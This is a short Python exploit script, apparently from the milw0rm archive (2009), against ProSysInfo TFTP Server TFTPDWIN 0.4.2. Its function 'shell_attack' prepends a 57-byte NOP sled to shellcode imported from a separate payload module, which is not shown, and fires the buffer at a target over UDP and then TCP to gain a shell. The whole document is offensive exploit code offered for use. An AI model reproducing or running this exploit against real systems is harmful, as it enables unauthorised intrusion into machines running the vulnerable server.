#!/usr/bin/python

#ProSysInfo TFTP Server TFTPDWIN 0.4.2
#Coded by Wraith

import socket
import struct
from struct import pack
from payload import buf
import time
def shell_attack(target_machine, target_port):
	nops = b"\x90"*57
	buffer = nops + buf

	target = target_machine
	
		
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	try:
		s.sendto(buffer, (target,target_port))
	
		time.sleep(2)
		c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		c.connect((target_machine, target_port)) 
		time.sleep(3)	
		c.send(buffer)
		c.close
	except:
		pass	

	# milw0rm.com [2009-08-18]